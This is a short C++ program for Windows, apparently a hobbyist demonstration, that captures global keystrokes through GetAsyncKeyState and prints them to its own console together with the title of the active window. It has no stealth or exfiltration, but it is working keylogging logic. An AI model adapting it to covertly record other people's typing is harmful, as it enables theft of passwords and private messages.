//测试于Windows 10 企业版 LTSC x64
#define _HAS_STD_BYTE 0
#include<iostream>
#include <Windows.h>
#include <string>
#include <cstring>
#include <conio.h>
using  namespace std;
const int length_ = 256;
int keydu(int num, string s);
void keys_number_1();
string ch_1[]{ {"(Bak)"},{"(Tab)"},{"(Etr)"},{"(Esc)"},{"(Spa)"},{"(Del)"},{"(左)"},{"(上)"},{"(右)"},{"(下)"},{"(CpL)"},{"(Win)"},{"(Win)"},{"(Ctr)"} };
int ch_1_len = sizeof(ch_1) / sizeof(ch_1[0]);
char ch_1_[]{ 0x08,0x09,0x0D,0x1B,0x20,0x2E,0x25,0x26,0x27,0x28,0x14,0x5B,0x5C,0x11 };
int main() {
	cout << "这是检测输入的,但不支持(~`-_=+[{]};:'\"<,>./?)这些符号的检测\n";
	int count = 1;
	char titles[length_] = { 0 };
	HWND preWindow = NULL;
	while (1) {
		HWND window = GetForegroundWindow();
		if (window != preWindow) {
			GetWindowText(window, titles, length_);
			cout << "\n当前活动窗口:" << titles << endl;
			preWindow = window;
		};
		Sleep(count);
		keys_number_1();
	};
	system("pause");
	return 0;
}
void keys_number_1() {
	string s;
	int ch = 0x41;
	int t = 0, k = 0;
	for (int i = 0; i < ch_1_len; i++) {
		keydu(ch_1_[i], ch_1[i]);
	}
	for (int ch = 0x30; ch < 0x39; ++ch) {
		if ((GetAsyncKeyState(0x10) & 0x8000) && (GetAsyncKeyState(ch) & 0x8000)) {
			while ((GetAsyncKeyState(0x10) & 0x8000) && (GetAsyncKeyState(ch) & 0x8000));
			cout << "(shift+" << char(ch) << ')';
			k = 1;
		};
		if ((GetAsyncKeyState(ch) & 0x8000) && (k == 0)) {
			while (GetAsyncKeyState(ch) & 0x8000);
			cout << char(ch);
		};
	};
	for (; ch <= 0x5A; ++ch) {
		if ((GetAsyncKeyState(0x10) & 0x8000) && (GetAsyncKeyState(ch) & 0x8000)) {
			while ((GetAsyncKeyState(0x10) & 0x8000) && (GetAsyncKeyState(ch) & 0x8000));
			cout << char(ch);
			t = 1;
		};
	};
	if (t == 0) {//这里我的键盘有问题,键盘上的A就是0x41
		for (ch = 0x41; ch <= 0x5A; ++ch) {
			if (GetAsyncKeyState(ch) & 0x8000) {
				while (GetAsyncKeyState(ch) & 0x8000);
				cout << char(ch + 32);
			};
		};
	};
	for (int ch = 0x60; ch <= 0x69; ++ch) {
		if (GetAsyncKeyState(ch) & 0x8000) {
			while (GetAsyncKeyState(ch) & 0x8000);
			cout << char(ch - 48);
		};
	};
};
int keydu(int num, string s) {
	if (GetAsyncKeyState(num) & 0x8000) {
		while (GetAsyncKeyState(num) & 0x8000);
		cout << s;
		return 1;
	}
	else {
		return 0;
	}
};